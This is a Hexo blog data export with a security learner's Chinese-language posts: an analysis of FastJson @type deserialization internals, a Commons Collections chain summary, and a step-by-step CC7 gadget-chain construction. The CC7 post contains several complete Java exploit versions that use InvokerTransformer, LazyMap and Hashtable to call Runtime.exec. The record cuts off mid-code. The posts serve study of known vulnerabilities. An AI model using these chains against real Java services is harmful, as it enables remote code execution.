{"meta":{"title":"n1utra's blog","subtitle":"","description":"网络安全","author":"n1utra","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2025-07-06T15:25:15.315Z","updated":"2025-07-06T15:25:15.315Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"一个用来记录自己学习过程的博客。"},{"title":"所有分类","date":"2025-06-21T19:52:31.922Z","updated":"2025-06-21T19:52:31.922Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2025-06-21T19:53:20.497Z","updated":"2025-06-21T19:53:20.497Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"参考连接","date":"2025-08-03T11:51:05.447Z","updated":"2025-08-03T11:51:05.447Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":"这里是我在学习过程中参考学习的一些师傅的链接： 白日梦组长的个人空间-白日梦组长个人主页-哔哩哔哩视频 drun1baby.top Firebasky&#x2F;Java: 关于学习java安全的一些知识,正在学习中ing,欢迎fork and star Y4tacker&#x2F;JavaSec: a rep for documenting my study, may be from 0 to 0.1"}],"posts":[{"title":"浅述Fastjson(1)：FastJson反序列化流程分析","slug":"FastJson反序列化流程分析","date":"2025-08-03T11:39:42.000Z","updated":"2025-08-03T16:47:10.735Z","comments":true,"path":"2025/08/03/FastJson反序列化流程分析/","permalink":"http://example.com/2025/08/03/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/","excerpt":"","text":"环境准备直接在pom.xml文件中添加fastjson的maven坐标 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt;&lt;/dependency&gt; 新建一个类用来作为json的对象，这里面会输出构造方法、setter/getter方法的调用信息 1234567891011121314151617181920212223242526272829303132333435public class Person &#123; private String name; private int age; public Person(String name, int age) &#123; this.name = name; this.age = age; System.out.println(&quot;全参构造&quot;); &#125; public Person() &#123; System.out.println(&quot;无参构造&quot;); &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public int getAge() &#123; System.out.println(&quot;getAge&quot;); return age; &#125; public void setAge(int age) &#123; System.out.println(&quot;setAge&quot;); this.age = age; &#125;&#125; 调用fastjson，fastjson将json转为对象有两个方法，parse、parseObject，这两者的区别在后续就能看到。这里采用parseObject。 12345678public class JSON124 &#123; public static void main(String[] args) &#123; String s = &quot;&#123;\\&quot;@type\\&quot;: \\&quot;Person\\&quot;, \\&quot;age\\&quot;: 18, \\&quot;name\\&quot;: \\&quot;ttt\\&quot;&#125;&quot;; JSONObject json = JSON.parseObject(s); &#125;&#125; 运行一下，能够看到调用了无参构造、setter/getter方法 那么正式开始分析。 流程分析方法起始点直接进入parseObject方法，可以看到这里先是调用了parse方法获取了一个对象，这个对象其实就是获取的Person对象，然后将这个对象又转为了JSONObject对象进行返回，这个JSONObject其实就是一个Map。 这里parseObject方法中调用的parse和parse方法是同一个方法，具体区别就是在parseObject中是将获取的对象又转为了JSONObject。 进入这个parse，又在调用parse，进入这个第二个parse方法，这里先是创建了一个默认的JSON解析器DefaultJSONParser，然后调用这个解析器的parse方法 1234567891011121314public static Object parse(String text, int features) &#123; if (text == null) &#123; return null; &#125; DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features); Object value = parser.parse(); parser.handleResovleTask(value); parser.close(); return value;&#125; 核心逻辑部分进入这个parse方法，里面调用了DefaultJSONParser#parse方法，进入这个方法，核心逻辑都在这里 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384public Object parse(Object fieldName) &#123; final JSONLexer lexer = this.lexer; switch (lexer.token()) &#123; case SET: lexer.nextToken(); HashSet&lt;Object&gt; set = new HashSet&lt;Object&gt;(); parseArray(set, fieldName); return set; case TREE_SET: lexer.nextToken(); TreeSet&lt;Object&gt; treeSet = new TreeSet&lt;Object&gt;(); parseArray(treeSet, fieldName); return treeSet; case LBRACKET: JSONArray array = new JSONArray(); parseArray(array, fieldName); if (lexer.isEnabled(Feature.UseObjectArray)) &#123; return array.toArray(); &#125; return array; case LBRACE: JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField)); return parseObject(object, fieldName); case LITERAL_INT: Number intValue = lexer.integerValue(); lexer.nextToken(); return intValue; case LITERAL_FLOAT: Object value = lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal)); lexer.nextToken(); return value; case LITERAL_STRING: String stringLiteral = lexer.stringVal(); lexer.nextToken(JSONToken.COMMA); if (lexer.isEnabled(Feature.AllowISO8601DateFormat)) &#123; JSONScanner iso8601Lexer = new JSONScanner(stringLiteral); try &#123; if (iso8601Lexer.scanISO8601DateIfMatch()) &#123; return iso8601Lexer.getCalendar().getTime(); &#125; &#125; finally &#123; iso8601Lexer.close(); &#125; &#125; return stringLiteral; case NULL: lexer.nextToken(); return null; case UNDEFINED: lexer.nextToken(); return null; case TRUE: lexer.nextToken(); return Boolean.TRUE; case FALSE: lexer.nextToken(); return Boolean.FALSE; case NEW: lexer.nextToken(JSONToken.IDENTIFIER); if (lexer.token() != JSONToken.IDENTIFIER) &#123; throw new JSONException(&quot;syntax error&quot;); &#125; lexer.nextToken(JSONToken.LPAREN); accept(JSONToken.LPAREN); long time = ((Number) lexer.integerValue()).longValue(); accept(JSONToken.LITERAL_INT); accept(JSONToken.RPAREN); return new Date(time); case EOF: if (lexer.isBlankInput()) &#123; return null; &#125; throw new JSONException(&quot;unterminated json string, &quot; + lexer.info()); case ERROR: default: throw new JSONException(&quot;syntax error, &quot; + lexer.info()); &#125;&#125; 可以看到这里是主要是针对lexer.token的逻辑操作，这个lexer.token是什么呢？ lexer.tokenlexer是一个词法分析器，而lexer.token是分析器处理后的基本单位，可以看到这里面包含很多信息 token可以类比于一个指针，指向对应的字符，token中包含了当前标记类型、具体值、位置等信息。比如这里token为12，12表示&#123;这个符号，当使用lexer.nextToken等代码之后，就会移动向下一个词法，比如&#123;&quot;aaa&quot;&#125;，这里第一次是&#123;，&quot;会识别为字符串的开始，然后读取的就是aaa，最后读取到&#125; 说完lexer.token，回到fastjson代码中，当前lexer.token获取到的是&#123;符号，就会进入LBRACE这个case 这里新建了一个JSONObject对象，然后返回时执行了parseObject 进入parseObject这个方法看看，可以看到，当前两个参数都都没有。看看这段代码，前面几个if都是判断边界值，不太重要直接跳过 然后会进入一个for(; ; )死循环，只有当运行到break或者是return之类的操作才会跳出循环 查看这部分死循环的代码可以看到是通过lexer.getCurrent读取到当前正在处理的词法为&quot;，那么就会进入到if (ch == &#39;&quot;&#39;) 这个判断 这里lexer.getCurrent是返回当前正在处理的具体字符，字符串开始时，当前字符就是双引号。而lexer.token时标记类型的数值表示，二者是不同的。 在这个判断中，通过lexer.scanSymbol(symbolTable, &#39;&quot;&#39;);从当前字符位置读取，直到遇到&quot;位置，那么这里key就是@type这几个字符 继续往下执行，会进行到如下部分代码，这里判断key是否为一个常量，而这个常量就是@type,也就是说这里就是指定类进行反序列化的关键。那么进入这里的代码，就表示要做java反序列化而不仅仅是json反序列化 TypeUtils.loadClass代码中可以看到，首先就执行了loadClass这个方法，那么进入这个方法看看。 可以看到这里接收到的className，就是Person类 然后通过mappings.get(className);，通过这个方法在缓存中查找类，但是这里没有找到，所以clazz的值为null，继续往下运行 可以看到，这里还存在两个判断，如果第一位是中括号，表示是数组，就使用数组的方法。如果类名前面是L，后面是;，就去掉然后重新调用当前方法。 这里会帮助后续的一些绕过，这里暂时先不看，继续往下运行。 在下面代码中获得当前上下文的classLoader，然后用AppClassLoader这个类加载器进行加载，加载完成后放到缓存中再返回，就跳出了死循环与loadClass方法，拿到了Class对象。这个clazz对象就是反射中获取的类文件，可以执行反射的后续操作。 回到DefaultJSONParser#parseObject方法。 此时已经拿到了TypeUtils.loadClass(typeName, config.getDefaultClassLoader());执行获得的clazz对象 继续往下运行，会直接运行到if (object.size() &gt; 0)这个判断。 这里的object是当前方法接收到的参数，当前接收到的参数为0，所以这里直接跳过 往下执行，这里获取一个反序列化器，然后通过反序列化器进行反序列化，这一段是比较重要的，前面都是解析器进行解析的部分，都是基于字符串的操作。由于之前进入了@type的逻辑，所以这里是按照java的方法进行java对象解析。 ParseConfig#getDeserializer进入ParseConfig#getDeserializer这个方法，第一行代码this.derializers.get(type);也是在缓存中查找对应的反序列化器。 在derializers中，这个类初始化的时候就会将一些系统内置类对应的反序列化器进行载入。 继续往下执行，进入if (type instanceof Class&lt;?&gt;) 这个判断，这里返回时会执行getDeserializer这个操作，进入这里看看。 这里的type参数就是前面获取的clazz对象 前面两个判断都是在缓存中查找，这里没有，继续往下执行，这里会进入for (int i = 0; i &lt; denyList.length; ++i)，这里就是默认的黑名单。也就是说在漏洞爆出来之前就存在于一个黑名单，但是这个黑名单中只有线程相关的类。这个黑名单可能是出于性能上的考虑。 我们当前的类名是Person，自然不会匹配到黑名单。 继续往下执行，这里是根据包名来选择对应的处理 我们这里都不满足，所以继续向下执行，执行到if (clazz.isEnum())这里的判断，这里都不满足，会执行到最后的else里面 然后会执行到createJavaBeanDeserializer(clazz, type);这部分代码，这个方法把类当成JavaBean来解析，进入这个方法 ParseConfig#createJavaBeanDeserializer方法的第一行代码中的asmEnable是java底层中的一个动态创建类动态加载的技术，默认为true，后面的判断是根据情况来决定是否支持这个技术。 JavaBeanInfo一直往下执行，执行到JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy); 进入这个Build方法，这里是在了解这个类的内容，比如getter/setter方法，然后组成一个JavaBeanInfo 继续向下执行，会看到方法中存在三个for循环 根据方法名可知，这里分别在遍历set方法、类的属性、get方法。 遍历set方法这里在获取要加载类的所有set方法，然后判断这个方法名是否小于4、是否为static、返回值是否为void或它本身，最后还必须满足set开头 当经过这些判断之后，会获取第4个字符，也就是setName中的N 然后再通过Character.toLowerCase将所有字符转为小写，后面还判断了_、f、is等字符，这里是为了兼容特殊写法，对整个逻辑没有影响。 执行完这些操作之后，会通过TypeUtils.getField(clazz, propertyName, declaredFields);去clazz查找propertyName的字段，然后返回Field对象 继续向下执行，在循环的最后有一个add方法的调用，这里面又执行了new FieldInfo这个操作 查看new FieldInfo，这里面设置了一个getOnly的属性为false，这里需要注意，可能会对后续利用造成影响。如果要设置为true，那么方法的参数就不能为1 执行完set方法的循环（遍历过程中会遇到一些内置方法），接下来会执行到属性循环 遍历属性这里是获取public修饰的属性，但是目标类并没有这类属性，所以这里不会进入循环。 遍历get方法进入遍历get方法的代码。 这里其实和遍历get的差别不大，需要满足方法名长度大于4、方法不为静态方法、方法参数为0 但是在add之前新增了一个if判断。就是get方法的返回值需要满足指定的类型。 满足之后才会进行add，但是我们这里都不满足。那么就不会执行到后续代码 这里其实是在为Bean对象找到类中的属性，以及对应的set方法，这里没有get方法，和上面的遍历有关，反序列化是赋值，只有不存在set方法，才会去寻找get 当遍历完方法和属性之后，会返回一个JavaBeanInfo对象 回到ParseConfig#createJavaBeanDeserializer方法中，这里拿到了build方法构建的Bean 然后后面的判断都是根据这个Bean的情况，去选择是否关闭ASM 其中存在一个判断，if (fieldInfo.getOnly)，满足getOnly就会关闭ASM 这个ASM在这里的作用是什么呢？ 在下面有一个判断，如果ASM是关闭状态，就会创建一个JavaBeanDeserializer，就是使用系统内置的反序列化器 反之则是调用asmFactory.createJavaBeanDeserializer临时创建一个类作为反序列化器 这个临时反序列化器没办法进行调试，不能看到反序列化是如何操作的 也就是说要想看到fastjson是如何进行反序列化的，那么就需要进入系统内置的反序列化器 那么我们这里想办法改变getOnly的属性即可。 关闭getOnly要关闭getOnly,只有一个地方 1234567891011# FieldInfo#FieldInfoif (method != null) &#123; Class&lt;?&gt;[] types; if ((types = method.getParameterTypes()).length == 1) &#123; fieldClass = types[0]; fieldType = method.getGenericParameterTypes()[0]; &#125; else &#123; fieldClass = method.getReturnType(); fieldType = method.getGenericReturnType(); getOnly = true; &#125; 这里需要满足method != null，然后不满足(types = method.getParameterTypes()).length == 1，也就是说一个方法的参数不能为1。 但是这里还存在一个问题。设置getOnly的地方在FieldInfo#FieldInfo中，这里是从遍历set方法时进入add方法调用到的,并且在进行add之前，还存在一个判断 1234Class&lt;?&gt;[] types = method.getParameterTypes();if (types.length != 1) &#123; continue;&#125; 如果参数个数不为1，直接跳出循环，也就是说遍历set时根本没办法满足条件，那么只能从遍历get方法处进行。 遍历get时要进入add方法，那么就需要满足其中的条件，也就是说返回值要满足指定类型。那么这里就给Person类新增一个属性，这个属性只有一个get方法。 此时再次开始调试，在设置getOnly的地方打上断点，发现能够满足条件设置getOnly为true，此时已经能够拿到JavaBeanDeserializer 当前过程分析 使用fastjson反序列化时，会满足case LBRACE这个条件，然后按照字符串进行解析 按照字符串解析时，发现存在@type，然后按照Java对象进行反序列化 按照java反序列化需要一个反序列化器 前面获取到了反序列化器，后面就会调用这个反序列化器的反序列化方法 JavaBeanDeserializer.deserialze此时拿到了Java内置序列化器的反序列化器了，然后通过这个反序列化器的deserialze进行反序列化，我们来看看这里面是怎么调用到无参构造和setter方法的 进入deserialze方法，也是层层调用，直接进入最后调用到的方法。 继续执行，会经过一系列判断，这里基本都不满足，直接向下执行 执行到循环for (int fieldIndex = 0;; fieldIndex++) 处，这里就是在遍历所有的字段 中间会存在很多类型判断 执行无参构造和set方法一直向下执行，执行到if (object == null &amp;&amp; fieldValues == null) 这个判断，这里会执行createInstance这个方法 这个方法会判断目标类是接口还是什么，如果是接口就创建动态代理 如果不是接口，就通过newInstance创建实例 在创建实例的过程时就触发了无参构造 获取到实例之后，在后续的判断中会进入一个setVlue方法 这里是执行到boolean match = parseField(parser, key, object, type, fieldValues);，进入parseField方法，又执行到fieldDeserializer.parseField方法，然后再parseField这个方法中会执行到setValue 在setValue中通过反射完成了赋值 比如说当前method为setAge，Object是前面创建的实例，value则是反序列化字符串传递的参数 执行完这个方法，就能在控制台看到set方法被执行 get方法的执行这里只看到执行了set方法，那么get方法在哪执行呢？ 前面说过，parseObject和parse方法的区别是，parseObject返回的时候是转为JSONObject，get方法就是在这个过程中被调用的。 进入toJSON方法 这里经过层层调用，进入了如下代码 一直向下执行，会执行到ObjectSerializer serializer = config.getObjectWriter(clazz);这里，进入getObjectWriter方法，在getObjectWriter方法中，会执行到put(clazz, createJavaBeanSerializer(clazz));方法 进入createJavaBeanSerializer方法，这里调用了TypeUtils.buildBeanInfo(clazz, null, propertyNamingStrategy); 进入buildBeanInfo方法，这里找到属性以及对应的方法 返回到JSON类中，在ObjectSerializer serializer = config.getObjectWriter(clazz);执行结束后，继续向下执行，执行到Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);时，进入getFieldValuesMap方法 可以看到这里执行了一个getter.getPropertyValue(object)方法 进入getPropertyValue方法，会执行fieldInfo.get这个方法，在这个方法中可以看到，也是通过method.invoke方法来执行 总结在fastjson反序列化时，会通过invoke去调用set方法进行赋值，如果使用了parseObject，那么还会调用get方法获取值。 如果反序列化时字符串中某个属性符合getOnly的要求，那么这个属性的get方法会在set的时候调用。这里是因为某些属性被transient修饰时，一定会写get方法，还原对象时通过get方法来还原值。 如果找到一个恶意的set方法，那么把这个方法所在类按照格式传入即可。","categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"FastJson反序列化","slug":"FastJson反序列化","permalink":"http://example.com/tags/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"CC链总结","slug":"CC链总结","date":"2025-07-21T15:31:18.000Z","updated":"2025-07-21T16:13:10.277Z","comments":true,"path":"2025/07/21/CC链总结/","permalink":"http://example.com/2025/07/21/CC%E9%93%BE%E6%80%BB%E7%BB%93/","excerpt":"","text":"CC链1-7利用链概述由于我自己写的部分CC链中进行了一定修改，所以这里采用yso中的链 这张图大概描述了CC链1-7的调用过程仔细观察能够发现，都是反序列化入口-&gt;调用点-&gt;执行点这种规律，部分链甚至是基于其他链进行拆分组合 CC链的其他问题CC链1是如何修复的CC链1-TransformedMap在jdk8u71版本中就被修复了，查看8u71的AnnotationInvocationHandler#readObject与8u65版本进行对比 在8u65中，我们是通过memberValue.setValue触发，而memberValue来自于构造方法中memberValues遍历获得 在8u71中，memberValue来自于streamVals，而streamVals是在Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);获取的，而我们无法控制这里，所以这条链就中断了。而LazyMap链则不受此修改影响 其他后续补充","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(8)：CC链7","slug":"CC链7","date":"2025-07-20T11:37:04.000Z","updated":"2025-07-21T15:25:33.078Z","comments":true,"path":"2025/07/20/CC链7/","permalink":"http://example.com/2025/07/20/CC%E9%93%BE7/","excerpt":"","text":"CC链7CC链7同样是在LazyMap#get的基础上进行了修改，这里找到的调用点找到了AbstractMap#equals这里，然后会被AbstractMapDecorator#equals调用，AbstractMapDecorator#equals又被Hashtable#reconstitutionPut调用。这里涉及到装饰器的设计模式，中间的调用不是之前那种直接查找用法。 简单来说： 执行lazyMap.equals时，LazyMap本身没有equals，但是继承了AbstractMapDecorator这个装饰器，所以会去执行AbstractMapDecorator中的equals，但是AbstractMapDecorator中没有自己重写equals方法，而AbstractMapDecorator这个装饰器是装饰了AbstractMap这个类，那么就会调用到AbstractMap#equals。 这里如果是xxxMapDecorator，这个xxxMapDecorator没有重写xxx方法，就会执行到xxxMap本身的xxx方法 调用点：AbstractMap#equalsAbstractMap#equals方法实现如下： 1234567891011121314151617181920212223242526272829303132public boolean equals(Object o) &#123; if (o == this) return true; if (!(o instanceof Map)) return false; Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o; if (m.size() != size()) return false; try &#123; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) &#123; Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) &#123; if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; &#125; else &#123; if (!value.equals(m.get(key))) return false; &#125; &#125; &#125; catch (ClassCastException unused) &#123; return false; &#125; catch (NullPointerException unused) &#123; return false; &#125; return true;&#125; 这里的equals中有一个m.get，这里的m来自于Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;，o是我们传入的对象，也就是说要给equals中传入恶意的Map。那么这里就是lazyMap1.equals(Map)，需要两个lazyMap，其中lazyMap2是我们构造的恶意map 此时尝试一下构造exp，执行之后能够弹出计算器，则没有问题， 1234567891011121314151617181920212223public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 恶意的LazyMap，放入equals中的 HashMap&lt;Object, Object&gt; hMap1 = new HashMap&lt;&gt;(); hMap1.put(&quot;key1&quot;, &quot;value1&quot;); LazyMap decorateEXP = (LazyMap) LazyMap.decorate(hMap1, chainedTransformer); // 普通LazyMap，用来调用equals HashMap&lt;Object, Object&gt; hMap2 = new HashMap&lt;&gt;(); hMap2.put(&quot;key2&quot;, &quot;value2&quot;); Map decorate = LazyMap.decorate(hMap2, new ConstantTransformer(1)); if (decorate.equals(decorateEXP)) &#123; System.out.println(&quot;test&quot;); &#125;&#125; 需要注意的是：在AbstractMap#equals中存在的if判断基本不需要绕过，这里不管是否为null，都会调用到m.get，这里的value来自于hMap2中的value，也可以直接把这个值写为null 1234567if (value == null) &#123; if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false;&#125; else &#123; if (!value.equals(m.get(key))) return false;&#125; 那么接下来，我们需要去寻找能够执行到AbstractMapDecorator#equals的地方，或者说接收任意Map为参数，并且用这个参数调用了equals的地方 调用点：Hashtable#reconstitutionPut在Hashtable#reconstitutionPut中存在一处调用 123456789101112131415161718192021private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value) throws StreamCorruptedException&#123; if (value == null) &#123; throw new java.io.StreamCorruptedException(); &#125; // Makes sure the key is not already in the hashtable. // This should not happen in deserialized version. int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % tab.length; for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; &#125; // Creates the new entry. @SuppressWarnings(&quot;unchecked&quot;) Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index]; tab[index] = new Entry&lt;&gt;(hash, key, value, e); count++;&#125; 其中key的属性为K，而K是一个泛型，可以是一个非基本类型的任意的引用类型，也就可以是一个Map 代码中调用equals的地方在e.key.equals(key)，这里的e是一个链表中的节点，是Hashtable内部数组tab中某个桶链表上的节点对象。可以简单类比于for (int i = 0; i &lt; 10; i++) &#123;list[i]&#125;中的list[i]。 而这里的key则是该方法接收的参数，并且这里是key.equals(key),那么这里是否会对反序列化造成影响，还需要后续查看 那么接下来就查找该方法的调用 反序列化入口：Hashtable#readObject在当前类的readObject方法中找到了reconstitutionPut的调用 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException&#123; // Read in the length, threshold, and loadfactor s.defaultReadObject(); // Read the original length of the array and number of elements int origlength = s.readInt(); int elements = s.readInt(); // Compute new size with a bit of room 5% to grow but // no larger than the original size. Make the length // odd if it&#x27;s large enough, this helps distribute the entries. // Guard against the length ending up zero, that&#x27;s not valid. int length = (int)(elements * loadFactor) + (elements / 20) + 3; if (length &gt; elements &amp;&amp; (length &amp; 1) == 0) length--; if (origlength &gt; 0 &amp;&amp; length &gt; origlength) length = origlength; table = new Entry&lt;?,?&gt;[length]; threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1); count = 0; // Read the number of elements and then all the key/value objects for (; elements &gt; 0; elements--) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K)s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V)s.readObject(); // synch could be eliminated for performance reconstitutionPut(table, key, value); &#125;&#125; 其中key来自于(K)s.readObject();，当前类Hashtable实现了Map接口，可以说也是一个Map类型，那么key就是传入Hashtable中的键名key 可以尝试构造下EXP，看看有没有什么问题 构造EXP那么构造如来的EXP如下，新建一个Hashtable，并将构造的恶意LazyMap作为键名传入 123456789101112131415161718192021222324public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 恶意的LazyMap，放入equals中的 HashMap&lt;Object, Object&gt; hMap1 = new HashMap&lt;&gt;(); hMap1.put(&quot;key1&quot;, &quot;value1&quot;); LazyMap decorateEXP = (LazyMap) LazyMap.decorate(hMap1, chainedTransformer); // 普通LazyMap，用来调用equals //HashMap&lt;Object, Object&gt; hMap2 = new HashMap&lt;&gt;(); //hMap2.put(&quot;key2&quot;, &quot;value2&quot;); //Map decorate = LazyMap.decorate(hMap2, new ConstantTransformer(1)); Hashtable&lt;Object, Object&gt; tableMap = new Hashtable&lt;&gt;(); tableMap.put(decorateEXP, &quot;tableMapValue&quot;); //util.serialize(tableMap); util.unserialize(&quot;ser.bin&quot;); &#125; 但是执行之后发现反序列化并没有弹出计算器，通过动态调试看看问题在哪 动态调试时发现，当前代码反序列化时在reconstitutionPut方法处根本不会进入循环 根据调试信息，tab中所有元素都为null，这个tab来自于该方法接收到的参数，而这个参数在readObject中进行创建 也就是说我们当前运行到reconstitutionPut方法时接收到的参数本身就没有值，根据代码，当reconstitutionPut方法中循环之后才会进行赋值 而这个方法本身在readObject中就是被循环调用的，也么想要能够弹出计算器，至少需要时在readObject中进入第二次循环，此时table才不为null，我们也能够进入reconstitutionPut方法中的for循环 那么看看readObject中循环是如何进行的，这里的循环次数是由elements决定 12345678for (; elements &gt; 0; elements--) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K)s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V)s.readObject(); // synch could be eliminated for performance reconstitutionPut(table, key, value);&#125; elements又是通过s.readInt();获取，这里s.readInt()获取到的值是HashTable中存储的键值对个数 也就是说我们需要给HashTable传入两个键值对，并且恶意键值对需要放在第二个。 此时构造出EXP如下： 12345678910111213141516171819202122232425public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 恶意的LazyMap，放入equals中的 HashMap&lt;Object, Object&gt; hMap1 = new HashMap&lt;&gt;(); hMap1.put(&quot;key1&quot;, &quot;value1&quot;); LazyMap decorateEXP = (LazyMap) LazyMap.decorate(hMap1, chainedTransformer); //普通LazyMap，用来调用equals HashMap&lt;Object, Object&gt; hMap2 = new HashMap&lt;&gt;(); hMap2.put(&quot;key2&quot;, &quot;value2&quot;); //Map decorate = LazyMap.decorate(hMap2, new ConstantTransformer(1)); Hashtable&lt;Object, Object&gt; tableMap = new Hashtable&lt;&gt;(); tableMap.put(hMap2, &quot;value1&quot;); tableMap.put(decorateEXP, &quot;tableMapValue2&quot;); util.serialize(tableMap); util.unserialize(&quot;ser.bin&quot;);&#125; 再次运行，序列化时就弹出计算器，并且伴随报错Exception in thread &quot;main&quot; java.io.WriteAbortedException: writing aborted; java.io.NotSerializableException: java.lang.ProcessImpl出现，也就是说这里时已经把命令执行的结果进行序列化，但是这个结果是一个ProcessImpl，是不支持序列化的，这也会导致反序列化 所以我们需要在序列化时不能执行命令，这好像是LazyMap链的老问题了，还是采用改变利用链的方法，先传入任意一个transformer，然后通过反射修改即可 此时EXP如下， 1234567891011121314151617181920212223242526272829303132333435public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 恶意的LazyMap，放入equals中的 HashMap&lt;Object, Object&gt; hMap1 = new HashMap&lt;&gt;(); hMap1.put(&quot;key1&quot;, &quot;value1&quot;); LazyMap decorateEXP = (LazyMap) LazyMap.decorate(hMap1, new ConstantTransformer(1)); //传入一个普通Map HashMap&lt;Object, Object&gt; hMap2 = new HashMap&lt;&gt;(); hMap2.put(&quot;key2&quot;, &quot;value2&quot;); //Map decorate = LazyMap.decorate(hMap2, new ConstantTransformer(1)); Hashtable&lt;Object, Object&gt; tableMap = new Hashtable&lt;&gt;(); tableMap.put(hMap2, &quot;value1&quot;); tableMap.put(decorateEXP, &quot;tableMapValue2&quot;); Class&lt;? extends LazyMap&gt; aClass = decorateEXP.getClass(); Field factoryField = aClass.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(decorateEXP, chainedTransformer); util.serialize(tableMap); util.unserialize(&quot;ser.bin&quot;);&#125; 但是序列化不报错不弹出计算器了，反序列化也不报错不弹出计算器，在Hashtable#reconstitutionPut处打上断点，看看问题在哪 注意，第一次运行到断点时是进入了readObject的第一次循环，此时是不会进入reconstitutionPut的循环中的，需要第二次运行到reconstitutionPut才能仅需循环 通过断点发现，此时if中的第一个条件结果为false，那么就不会进入第二个条件，直接跳过if中的代码进入后续代码了 也就是说(e.hash == hash)这里必须要为true，这里的hash是当前reconstitutionPut方法执行时获取的key的hash，那么还需要搞明白e.hash是什么，这里需要结合readObject方法中和reconstitutionPut方法的两段循环来看，简写代码如下： 1234567891011121314151617private void readObject()&#123; for (; elements &gt; 0; elements--) &#123; 